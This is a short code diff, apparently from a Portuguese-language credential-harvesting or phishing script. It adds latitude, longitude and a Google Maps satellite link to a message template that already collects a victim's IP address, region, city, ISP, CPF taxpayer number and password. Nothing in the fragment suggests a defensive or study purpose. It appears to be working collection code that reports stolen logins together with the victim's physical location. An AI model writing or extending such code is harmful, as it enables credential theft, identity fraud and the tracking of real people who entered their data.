@@ -77,6 +77,9 @@ IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
 Nome da região: ${responseGeoJson.regionName}
 Cidade: ${responseGeoJson.city}
+Latitude: ${responseGeoJson.lat}
+Longitude: ${responseGeoJson.lon}
+Mapa: https://www.google.com/maps/@${responseGeoJson.lat},${responseGeoJson.lon}/data=!3m1!1e3?entry=ttu
 Operadora: ${responseGeoJson.isp}
 CPF: ${cpf}
 Password: ${password}
